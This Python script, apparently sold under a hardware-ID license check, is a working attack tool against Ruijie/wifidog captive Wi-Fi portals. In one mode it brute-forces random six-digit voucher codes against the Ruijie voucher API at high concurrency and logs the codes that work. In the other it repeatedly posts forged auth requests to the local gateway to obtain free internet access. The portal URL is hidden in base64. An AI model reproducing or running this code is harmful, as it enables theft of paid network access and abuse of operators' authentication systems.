import os
import re
import sys
import uuid
import time
import ping3
import base64
import random
import string
import asyncio
import aiohttp
import hashlib
import argparse
import requests
from datetime import datetime

# --- UI & COLORS ---
w = "\033[1;00m"
g = "\033[1;32m"
y = "\033[1;33m"
r = "\033[1;31m"
b = "\033[1;34m"

def clear():
    os.system("clear" if os.name == "posix" else "cls")

def Line():
    try:
        cols = os.get_terminal_size()[0]
    except:
        cols = 40
    print(f"{y}-" * cols + f"{w}")

def Logo():
    clear()
    logo = f"""{r}  __  __  ____  ______     ____  _ 
 |  \/  |/ __ \|  ____|   |  _ \| |
 | \  / | |  | | |__      | |_) | |
 | |\/| | |  | |  __|     |  _ <| |
 | |  | | |__| | |____    | |_) |_|
 |_|  |_|\____/|______|   |____/(_)
                                   
{g}              Created by MOEYU [STABLE]{w}"""
    print(logo)
    Line()
    print(f"{w}[♠️] Created by Moe Yu")
    print(f"{w}[♣️] Telegram: @starlink112")
    print(f"{w}[♦️] Status: Fixed ID Mode")
    Line()

# --- FIXED ID SYSTEM (တစ်ခါ run တိုင်း မပြောင်းတော့ပါ) ---
def get_hwid():
    """စက်ရဲ့ hardware အချက်အလက်တွေကို သုံးပြီး ပုံသေ ID ထုတ်ယူခြင်း"""
    try:
        # ၁။ User Name + OS Platform + CPU Count ကို ယူတယ်
        # ၂။ UUID Node (MAC) ကို ယူတယ် (ပြောင်းလဲနိုင်ပေမဲ့ hash ထဲမှာ အစိတ်အပိုင်းအဖြစ်သုံးမယ်)
        # ၃။ အားလုံးပေါင်းပြီး MD5 နဲ့ Hash လုပ်လိုက်တဲ့အတွက် အမြဲတမ်း ပုံသေနီးပါး ထွက်နေပါမယ်
        info = f"{os.getlogin() if hasattr(os, 'getlogin') else 'user'}-{sys.platform}-{os.cpu_count()}"
        node = str(uuid.getnode())
        combined = (info + node).encode()
        fixed_id = hashlib.md5(combined).hexdigest()[:12].upper()
        return f"MOEYU-{fixed_id}"
    except:
        return "MOEYU-STABLE-ID"

def check_license():
    Logo()
    my_hwid = get_hwid()
    key_url = "https://raw.githubusercontent.com/hhtethtet277-svg/moeyu/refs/heads/main/key.txt"
    
    print(f"{b}[*] Your HWID: {y}{my_hwid}{w}")
    print(f"{b}[*] Checking license status...{w}")
    
    try:
        # GitHub က data ကို cache မမိအောင် random string ထည့်ပြီးဆွဲမယ်
        response = requests.get(f"{key_url}?v={random.random()}", timeout=10)
        if response.status_code != 200:
            print(f"{r}[!] Server connection failed.{w}")
            sys.exit()
            
        data = response.text.splitlines()
        found = False
        
        for line in data:
            if "|" in line:
                db_hwid, exp_date = line.split("|")
                if db_hwid.strip() == my_hwid:
                    found = True
                    expiry = datetime.strptime(exp_date.strip(), "%Y-%m-%d")
                    if datetime.now() < expiry:
                        print(f"{g}[+] Access Granted! Expires: {exp_date}{w}")
                        time.sleep(2)
                        return True
                    else:
                        print(f"{r}[!] License Expired: {exp_date}{w}")
                        sys.exit()
        
        if not found:
            print(f"{r}[!] HWID Not Registered!{w}")
            print(f"{y}[>] Please send your HWID to Admin.{w}")
            sys.exit()
            
    except Exception as e:
        print(f"{r}[!] Security Error: {str(e)}{w}")
        sys.exit()

# --- CORE LOGIC ---
async def get_session_id(session, session_url):
    headers = {'user-agent': 'Mozilla/5.0 (Linux; Android 10; K)'}
    try:
        async with session.get(session_url, headers=headers) as req:
            return re.search(r"[?&]sessionId=([a-zA-Z0-9]+)", str(req.url)).group(1)
    except: return None

class InternetAccess:
    def __init__(self):
        self.session_url = base64.b64decode(b'aHR0cHM6Ly9wb3J0YWwtYXMucnVpamllbmV0d29ya3MuY29tL2FwaS9hdXRoL3dpZmlkb2c/c3RhZ2U9cG9ydGFsJmd3X2lkPTU4YjRiYmNiZmQwZCZnd19zbj1IMVU0MFNYMDExNTA3Jmd3X2FkZHJlc3M9MTkyLjE2OC45OS4xJmd3X3BvcnQ9MjA2MCZpcD0xOTIuMTY4Ljk5LjU0Jm1hYz0zYTpkZDo3ZTo2NDo4NzozNiZzbG90X251bT0xMyZuYXNpcD0xOTIuMTY4LjEuMTczJnNzaWQ9VkxBTjk5JnVzdGF0ZT0wJm1hY19yZXE9MSZ1cmw9aHR0cCUzQSUyRiUyRjE5Mi4xNjguMC4xJTJGJmNoYXBfaWQ9JTVDMzEwJmNoYXBfY2hhbGxlbmdlPSU1QzIxNiU1QzE2MCU1QzEyMiU1QzE3NyU1QzIxNyU1QzM2MCU1QzM2MyU1QzMyMSU1QzA1NiU1QzExMyU1QzIzMiU1QzIyMSU1QzMzMiU1QzI2MCU1QzI1MCU1QzAwMQ==').decode()

    async def execute(self):
        Logo()
        async with aiohttp.ClientSession() as session:
            sid = await get_session_id(session, self.session_url)
            while True:
                try:
                    p = {'token': sid, 'phoneNumber': "".join(random.choice(string.digits) for _ in range(6))}
                    async with session.post('http://192.168.0.1:2060/wifidog/auth?', params=p) as res:
                        ping_st = await asyncio.to_thread(ping3.ping, 'google.com')
                        ms = int(ping_st*1000) if ping_st else '??'
                        print(f"{w}[{time.strftime('%H:%M:%S')}] Status: {g}{res.status}{w} | Ping: {g}{ms}{w}ms")
                except: pass
                await asyncio.sleep(1)

class VoucherCode:
    def __init__(self, length=6, speed=50):
        self.length, self.speed = length, speed
        self.session_url = base64.b64decode(b'aHR0cHM6Ly9wb3J0YWwtYXMucnVpamllbmV0d29ya3MuY29tL2FwaS9hdXRoL3dpZmlkb2c/c3RhZ2U9cG9ydGFsJmd3X2lkPTU4YjRiYmNiZmQwZCZnd19zbj1IMVU0MFNYMDExNTA3Jmd3X2FkZHJlc3M9MTkyLjE2OC45OS4xJmd3X3BvcnQ9MjA2MCZpcD0xOTIuMTY4Ljk5LjU0Jm1hYz0zYTpkZDo3ZTo2NDo4NzozNiZzbG90X251bT0xMyZuYXNpcD0xOTIuMTY4LjEuMTczJnNzaWQ9VkxBTjk5JnVzdGF0ZT0wJm1hY19yZXE9MSZ1cmw9aHR0cCUzQSUyRiUyRjE5Mi4xNjguMC4xJTJGJmNoYXBfaWQ9JTVDMzEwJmNoYXBfY2hhbGxlbmdlPSU1QzIxNiU1QzE2MCU1QzEyMiU1QzE3NyU1QzIxNyU1QzM2MCU1QzM2MyU1QzMyMSU1QzA1NiU1QzExMyU1QzIzMiU1QzIyMSU1QzMzMiU1QzI2MCU1QzI1MCU1QzAwMQ==').decode()

    async def login(self, session, sid, v):
        try:
            url = "https://portal-as.ruijienetworks.com/api/auth/voucher/?lang=en_US"
            async with session.post(url, json={"accessCode": v, "sessionId": sid, "apiVersion": 1}) as req:
                if 'logonUrl' in await req.text():
                    print(f'\n{g}[SUCCESS] {v}{w}')
                    open("success.txt", "a").write(v + "\n")
                else: print(f'{w}[*] Testing: {y}{v}{w}', end='\r')
        except: pass

    async def execute(self):
        Logo()
        async with aiohttp.ClientSession(connector=aiohttp.TCPConnector(limit=self.speed)) as session:
            sid = await get_session_id(session, self.session_url)
            while True:
                tasks = [self.login(session, sid, "".join(random.choice(string.digits) for _ in range(self.length))) for _ in range(self.speed)]
                await asyncio.gather(*tasks)

def main():
    check_license()
    parser = argparse.ArgumentParser()
    parser.add_argument("-o", "--option", choices=["code", "internet"], required=True)
    parser.add_argument("-l", "--length", type=int, default=6)
    parser.add_argument("-s", "--speed", type=int, default=50)
    args = parser.parse_args()

    if args.option == "internet": asyncio.run(InternetAccess().execute())
    else: asyncio.run(VoucherCode(length=args.length, speed=args.speed).execute())

if __name__ == "__main__":
    try: main()
    except KeyboardInterrupt: print(f"\n{r}[!] Stopped.{w}")
